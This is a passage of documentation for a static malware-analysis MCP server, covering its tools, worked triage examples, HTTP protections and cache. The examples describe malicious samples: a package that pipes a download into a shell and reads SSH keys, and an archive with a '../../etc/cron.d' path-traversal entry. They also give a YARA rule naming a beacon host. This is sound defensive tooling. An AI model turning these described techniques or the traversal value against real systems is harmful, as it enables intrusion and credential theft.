A registry name such as `express` or `lodash@4.17.4` is an error: run `npm pack express` and pass the `.tgz`.
Limits: up to 400 source files (`.js .mjs .cjs .ts .sh`), 1 MiB each and 16 MiB in all, are scanned; a package that
was not read in full is never rated safe. The advisory data is a small offline table (6 packages, newest advisory
2022). An empty vulnerability list does not mean the package is clean.

### analyze_python_package

The same tool for Python, with the same arguments and answer shape.

| Argument | Notes |
| --- | --- |
| `package_path`* | `.whl`, `.tar.gz`, `.zip`, a directory, `setup.py`, `pyproject.toml`, `requirements.txt`. |
| `section`, `query`, `min_severity`, `only_flagged` | As for `analyze_npm_package`. |

A `poetry.lock` file is accepted as a dependency list.
`setup.py` is checked for install-time behaviour. A PyPI name such as `requests==2.5.0` is an error: run
`pip download` and pass the file. Version matching follows PEP 440 with normalized names; an unpinned requirement is
unknown, not vulnerable. Limits: up to 400 source files (`.py .pth .sh`), 1 MiB each and 16 MiB in all. The advisory
data is a small offline table (7 packages, newest advisory 2023).

### cache_status

What the caches hold, and where.

| Argument | Notes |
| --- | --- |
| `action` | `stats` (default), `list` (past `analyze_file` and `yara_scan_file` calls, newest first), `search` (like `list`, needs a filter). |
| `tool_name`, `file_path_pattern` | Filters for `list` and `search`. |

```json
{
  "enabled": true, "persistent": true, "directory": "/Users/you/Library/Caches/file-scanner",
  "analysis_history": { "entries": 3, "files": 1, "result_bytes": 32200, "max_bytes_on_disk": 268435456,
                        "calls_by_tool": { "analyze_file": 3 } },
  "sections": { "entries": 19, "bytes": 81677, "max_entries": 256, "disk_enabled": true, "disk_files": 19, ... },
  "strings": { "unique": 185, "occurrences": 189, "files": 1, ... }
}
```

### cache_clear

Forget cached analyses and tracked strings. The only destructive tool; it is annotated that way so clients can ask
for confirmation.

| Argument | Notes |
| --- | --- |
| `scope` | `all` (default), `analysis` (call history and cached sections, including files on disk) or `strings`. |

It deletes only files the cache wrote. The answer lists what was cleared: `{"cleared": ["tracked strings"]}` for scope `strings`; the default scope returns `["analysis history, cached sections and files on disk", "tracked strings"]`. Later calls recompute.

## Worked examples

These are real sessions against the sample files shipped or built for this guide. Results are shortened.

### Triage an unknown binary

An unknown ELF arrives. Start with the overview:

```json
{ "name": "analyze_file", "arguments": { "file_path": "/samples/c_advanced_binary" } }
```

The overview shows an x86-64 ELF, not packed, with `127.0.0.1`, `/proc/self/status` and `ptrace` among its strings.
That combination suggests anti-debugging. Ask for the threat sections:

```json
{ "name": "analyze_file", "arguments": { "file_path": "/samples/c_advanced_binary",
                                         "sections": ["threats", "behavioral"] } }
```

The summaries report a Suspicious threat level and two built-in rule matches, `anti_analysis` and
`network_communication`. Read the strings behind them:

```json
{ "name": "query_analysis", "arguments": { "file_path": "/samples/c_advanced_binary", "section": "strings",
                                           "filter": "ptrace" } }
```

Then read the code that uses `ptrace`. Get the function list, pick a name, list its instructions:

```json
{ "name": "disassemble", "arguments": { "file_path": "/samples/c_advanced_binary", "function": "main",
                                        "max_instructions": 40 } }
```

When you want bytes around a string offset (12682 for `Debugger detected!`), use `read_hex`:

```json
{ "name": "read_hex", "arguments": { "file_path": "/samples/c_advanced_binary", "offset": 12640, "length": 96 } }
```

Every answer after the first said `cache: "hit"` or came from the cached sections, so the follow-ups were quick.
`all: true` in step one would have prepared all of them at once.

### Vet an npm package

You have a tarball (`npm pack left-pad-utils` writes it). The tool is offline, so give it the file:

```json
{ "name": "analyze_npm_package", "arguments": { "package_path": "/samples/left-pad-utils-1.0.3.tgz" } }
```

The summary rates the package Critical: a `postinstall` script pipes a download into a shell, `index.js` evaluates a
decoded payload and reads `~/.ssh/id_rsa`, and the pinned `lodash` 4.17.4 has an advisory. Page the evidence:

```json
{ "name": "analyze_npm_package", "arguments": { "package_path": "/samples/left-pad-utils-1.0.3.tgz",
                                                "section": "findings", "min_severity": "High" } }
```

Each finding has the file, line and matching text. Because the advisory table is small, treat a clean result as
"nothing found in this table", and run `npm audit` for dependency coverage. To inspect one file from the package,
unpack it and call `analyze_script` or `analyze_file` on that file.

### Hunt a string across files, then write and test a YARA rule

Index a few samples, then search all of them at once:

```json
{ "name": "search_strings", "arguments": { "file_path": "/samples/c_advanced_binary", "query": "msftupdater" } }
{ "name": "search_strings", "arguments": { "file_path": "/samples/rust_test_binary", "query": "msftupdater" } }
{ "name": "search_strings", "arguments": { "query": "msftupdater" } }
```

The third call, with no `file_path`, searches every file indexed this session and returns one row per distinct
string with the files that hold it. `string_details` then gives every offset. Get a draft rule from
`llm_analyze_file` and tighten it. The draft is tied to one file, so replace its `filesize` condition with strings
that identify the family:

```text
rule beacon_dropper {
  strings: $a = "msftupdater.com" $b = "GET /beacon HTTP/1.1"
  condition: uint32(0) == 0x464c457f and all of them
}
```

Test it against the whole directory:

```json
{ "name": "yara_scan_file", "arguments": { "path": "/samples/test_programs", "recursive": false,
                                           "yara_rule": "rule beacon_dropper { ... }" } }
```

The rule matched 2 of 25 files, each with the matched strings and offsets (see the `yara_scan_file` entry). If it
does not compile, the error gives the line and column; fix it and call again.

### Look inside an archive, a document or a script

An archive that came with an email:

```json
{ "name": "inspect_archive", "arguments": { "file_path": "/samples/report.tar.gz", "risky_only": true } }
```

It rates the archive critical and lists the two bad entries: `../../etc/cron.d/job` escapes the extraction directory,
and `invoice.pdf.exe` has a double extension. Nothing was extracted.

A PDF:

```json
{ "name": "analyze_document", "arguments": { "file_path": "/samples/invoice.pdf", "category": "script" } }
```

The summary shows JavaScript plus an `OpenAction` that runs when the file opens, with byte offsets to feed `read_hex`.

A shell script:

```json
{ "name": "analyze_script", "arguments": { "file_path": "/samples/dropper.sh" } }
```

It reports a download-and-run on line 3 and a cron entry on line 4. If you are not sure which tool fits, call
`analyze_file` first: its `next_steps` name the specialist.

## Transports and security

### Commands

| Command | Transport |
| --- | --- |
| `file-scanner mcp-stdio` | JSON-RPC over stdin and stdout, one JSON object per line. |
| `file-scanner mcp-http` | Streamable HTTP at `/mcp`, plus REST helper routes. |
| `file-scanner mcp-sse` | Deprecated alias of `mcp-http`: prints a notice, starts the same server. Use `/mcp`. |

### Options

| Option | Commands | Meaning |
| --- | --- | --- |
| `--allow-root <DIR>` | all | Directory the tools may read. Repeatable. |
| `--cache-dir <DIR>` | all | Cache directory (created with mode 0700). |
| `--no-cache` | all | Store and serve nothing from a cache. |
| `--port`, `-p <PORT>` | HTTP | Default 3000; 0 picks a free port. |
| `--host <HOST>` | HTTP | Bind address, default `127.0.0.1`. |
| `--allowed-host <HOST>` | HTTP | Extra `Host` value to accept (`name` or `name:port`). Repeatable. |
| `--allowed-origin <ORIGIN>` | HTTP | Extra browser `Origin` (`scheme://host[:port\|:*]`). Repeatable. |
| `--auth-token <TOKEN>` | HTTP | Bearer token required on every route except `/health`. |

### Environment variables

| Variable | Meaning |
| --- | --- |
| `FILE_SCANNER_ALLOWED_ROOTS` | `:`-separated allow-roots, used when no `--allow-root` is given. |
| `FILE_SCANNER_AUTH_TOKEN` | The bearer token. Prefer it to `--auth-token`: command lines are visible to other users. |
| `FILE_SCANNER_CACHE_DIR` | Cache directory, used when no `--cache-dir` is given. |
| `FILE_SCANNER_CACHE_DISK_MB` | Sets the section cache's disk budget (default 1 GiB) to N MiB and the analysis history's (default 256 MiB) to N/4. |
| `FILE_SCANNER_SECTION_CACHE_MB` | Memory budget of the section cache in MiB (default 256). |

No other environment variable changes the server. There is no log-level setting; the server prints a startup banner
and security-relevant events (refused requests, an unusable cache directory) to stderr.

### Protocol revisions

The server negotiates every revision from 2024-11-05 through 2026-07-28 and reports its name, version and usage
instructions in the `initialize` result. In HTTP mode, clients older than 2026-07-28 use sessions (the
`Mcp-Session-Id` header); 2026-07-28 requests are stateless and carry the protocol version in their request metadata.
On stdio, a request sent before `initialize` needs that metadata too, except `ping`, which is always answered.
The metadata goes in `params._meta` as `io.modelcontextprotocol/protocolVersion` and
`io.modelcontextprotocol/clientCapabilities`:

```json
{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{"_meta":{"io.modelcontextprotocol/protocolVersion":"2026-07-28","io.modelcontextprotocol/clientCapabilities":{}}}}
```

### HTTP protections, in the order they apply

1. **Host check.** The `Host` header must be `localhost`, `127.0.0.1`, `::1` or an `--allowed-host`. This stops DNS
   rebinding. Otherwise 403.
2. **Origin check.** A browser `Origin` header must be a loopback origin or an `--allowed-origin`. Otherwise 403.
   Clients that send no `Origin` (curl, SDKs) are not affected.
3. **Bearer token.** With `--auth-token`, every route except `/health` needs `Authorization: Bearer <token>`. A
   missing or wrong token gets 401 with `WWW-Authenticate: Bearer realm="file-scanner"`. The token is compared in
   constant time and never logged.
4. **Path scope.** With `--allow-root`, tools refuse paths outside the roots.

To serve other machines, bind a non-loopback address, name the host clients use, and set the token and roots:

```bash
export FILE_SCANNER_AUTH_TOKEN="$(openssl rand -hex 24)"
file-scanner mcp-http --host 0.0.0.0 --port 3000 --allowed-host files.example.com \
  --allow-root /srv/samples
```

The banner says what is active. Binding a non-loopback host without a token prints a warning. The server does not
terminate TLS: put a reverse proxy in front for HTTPS.

### REST helper routes

`mcp-http` also serves plain JSON routes on the same address, behind the same checks. They are not part of the MCP
protocol; they are for scripts and health checks.

| Route | Use |
| --- | --- |
| `GET /health` | `{"status":"ok","service":"file-scanner-mcp","version":"...",...}`. Needs no token. |
| `GET /api/info` | Routes, version and uptime. |
| `POST /initialize`, `POST /tools/list` | Server identity and tool schemas. |
| `POST /tools/call` | Call a tool: `{"name": "...", "arguments": {...}}`. Replies `{resultType, content, isError}`. |
| `GET /cache/list`, `GET /cache/stats` | Analysis history entries and statistics. |
| `POST /cache/search` | Body field `file_path_pattern` (not `file_path`), and `tool_name`. |
| `POST /cache/clear` | Clear the caches. |
| `/strings/stats` (GET); `/strings/search`, `/strings/details`, `/strings/related`, `/strings/filter` (POST) | String tracker. |
| `GET /api-docs/openapi.json` | OpenAPI description of the REST routes. |

REST requests time out after 120 seconds (504), and at most 16 run at once. An example call:

```bash
curl -s -X POST http://127.0.0.1:3000/tools/call -H 'Content-Type: application/json' \
  -d '{"name":"read_hex","arguments":{"file_path":"/samples/c_advanced_binary","length":16}}'
```

When the server is stopped with Ctrl-C or SIGTERM it ends open streams and exits 0.

## The cache

The server keeps two kinds of results, so drill-down calls do not repeat work.

- **Section cache.** Each section of `analyze_file` (and the listings of `inspect_archive`, the package and Java
  tools and similar) is stored by the file's SHA-256 and the options that change it. It holds compressed JSON text
  in memory (default 256 MiB) and on disk (default 1 GiB). When it is full, the least recently used entries go first.
  A repeated call on an unchanged file is a `hit`; editing the file changes its hash, so there is no stale result.
- **Analysis history.** One record per `analyze_file` and `yara_scan_file` call (arguments, hash, time), used by `cache_status` and the REST
  `/cache/*` routes. Results over 4 MiB are replaced by a size note. The total is bounded (256 MiB by default).

Where it lives:

| Platform | Default directory |
| --- | --- |
| Any platform | `$XDG_CACHE_HOME/file-scanner` when `XDG_CACHE_HOME` is set to an absolute path |
| Linux | else `~/.cache/file-scanner` |
| macOS | else `~/Library/Caches/file-scanner` |
| No usable home | A per-user directory under the system temp directory |

Override with `--cache-dir` or `FILE_SCANNER_CACHE_DIR`. The directory is created with mode 0700 and its files 0600.
If it cannot be used, the server prints one line on stderr and keeps the cache in memory only. Several servers can
share one directory.

What is stored: the results the tools returned or computed, including extracted strings and hex samples from the
files you analyzed, and the call history. The tracked-string index is kept in memory only and is rebuilt in each server process, so it is empty after a restart. The cached results on disk contain extracted strings and hex samples. It never stores a copy of the analyzed file. Treat the directory
as sensitive if the files were. Run `cache_clear` (or delete the directory) to remove it. `--no-cache` turns all of
it off; drill-down calls then recompute their sections each time.

At most `max(4, CPU count)` analyses run at the same time across all connections; others wait.

## Limits

What this server does and does not do.

- **Static only.** Nothing is executed, emulated or unpacked. A packed or encrypted sample shows the packer, not the
  payload.
- **Formats.** Binary analysis covers ELF, PE and Mach-O (thin and universal). Code analysis (disassembly,
  control flow, call graph, vulnerabilities) is built for x86 (32 and 64 bit) and, in part, ARM64; for other
  architectures expect an explicit error or a note. `disassemble` works on ELF and Mach-O; a universal Mach-O is read on one slice (the host's) and `arch` is ignored. PE
  support in `disassemble` was not tested.
  `analyze_document` reads PDF and Office (OLE2 and OOXML); `inspect_archive` lists zip, tar, tar.gz, RAR and 7z.
  Java: class files, JAR, WAR, EAR, AAR and APK manifests, but not DEX code. Scripts: shell, PowerShell,
  JavaScript, Python, batch and VBScript.
- **Heuristics.** Threat levels, behavioral findings, vulnerability findings, taint flows, "likely packed" and
  "likely encrypted" are heuristics. They can be wrong in both directions. Vulnerability rules match calls by name;
  a `Low` result is not a proof of safety. The built-in YARA rules are 10 general rules.
- **Offline vulnerability data.** The npm table has 6 packages and the Python table 7, with advisories up to 2022
  and 2023. Nothing is fetched. There is no CVE check for Java libraries or native binaries. Use `npm audit`,
  `pip-audit` or OSV for real coverage.
- **Signatures.** Signature checks report what is present. A missing verifier gives "Not checked", and Java
  signature files are listed, not verified.
- **Bounded work.** Sizes, counts and time are capped: results by `max_output_bytes`; string scans by count and
  bytes (a file with millions of strings keeps exact counts but a bounded list); disassembly to a bounded part of a
  large file (the rest is decoded on request); archives and packages by entry count, bytes read and decompressed
  size (a cut is named in the result); YARA by file size (100 MB), file count and a timeout; directory walks by
  entry count and time. Files over 256 MiB get a reduced overview.
- **Hostile files.** The parsers carry byte, count and time budgets, and a panic in one analyzer fails only that
  section. That is best-effort bounding, not a guarantee: a crafted file can still use a lot of memory or CPU before a
  budget stops it. When you scan untrusted files, run the server under an OS or container memory and CPU limit
  (`ulimit -v`, a systemd `MemoryMax=`, or `docker run --memory`), with `--allow-root` set.
- **Not a sandbox for the host.** The server reads only; it does not write outside its cache directory. But it will
  read whatever a caller asks for within `--allow-root`, so scope it.

## Troubleshooting

**The client says the server failed to start.** Run the exact command from the config in a terminal:
`/absolute/path/to/file-scanner mcp-stdio`. It should print a banner on stderr and wait. Use the absolute path; a
bare name often is not on a GUI client's `PATH`.

**No tools appear.** Restart the client after editing its config. In Claude Code run `claude mcp list`. Check that
`tools/list` returns 17 tools with the one-line session in [Testing by hand](#testing-by-hand).

**`403` from the HTTP server.** The `Host` or `Origin` header is not allowed. If clients reach the server through a
name, add `--allowed-host name`; for a browser app add `--allowed-origin`.

**`401` from the HTTP server.** The server has a token. Send `Authorization: Bearer <token>`.

**"outside the directories this server may read".** The path is not under an `--allow-root`. The message names the
allowed directories.

**Answers are cut off.** Look for `truncated`, `returned` and `next_offset`. Page with `offset`, narrow with
`filter`, or raise `max_output_bytes` (ceiling 400,000). Clients may still limit what they inline.

**Results look stale or you want a clean slate.** Call `cache_clear`, or start the server with `--no-cache`.

**Strings you expect are missing from `search_strings` without `file_path`.** Only files already analyzed or
searched in this session are indexed. Search the file once with `file_path` first.

See also: [INSTALLATION.md](INSTALLATION.md), [USAGE.md](USAGE.md) for the command-line interface, and
[../SECURITY.md](../SECURITY.md).
